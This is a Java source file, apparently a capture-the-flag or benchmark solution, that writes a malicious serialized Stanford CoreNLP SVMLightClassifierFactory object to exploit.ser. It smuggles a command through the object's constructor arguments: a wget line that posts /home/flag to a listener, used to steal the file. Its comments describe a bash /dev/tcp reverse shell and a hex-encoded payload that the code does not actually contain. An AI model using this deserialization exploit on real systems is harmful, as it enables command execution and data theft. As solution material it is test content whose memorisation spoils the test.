/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import edu.stanford.nlp.classify.SVMLightClassifierFactory;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;

public class sol {

    public static void main(String[] args) {
        // --- Your NEW Reverse Shell Payload ---
        // This payload executes a command from a hex string. A semicolon (;) has been added
        // to the beginning and end of the command. The semicolons ensure our command is
        // treated as a distinct statement, even with the junk arguments appended by the application.
        // The hex string decodes to: ';bash -i >& /dev/tcp/localhost/4444 0>&1;;'
	String cmd = "wget --post-file=/home/flag localhost:8000";

        try {
            // --- Create the Malicious Serialized Object ---
            SVMLightClassifierFactory exploitObject = new SVMLightClassifierFactory(cmd, cmd, "");

            // --- Write the Object to a File ---
            FileOutputStream fileOutputStream = new FileOutputStream("exploit.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            
            System.out.println("Creating serialized exploit object...");
            objectOutputStream.writeObject(exploitObject);
            objectOutputStream.flush();
            objectOutputStream.close();
            System.out.println("Successfully created exploit.ser");

        } catch (IOException e) {
            System.err.println("An error occurred:");
            e.printStackTrace();
        }
    }
}

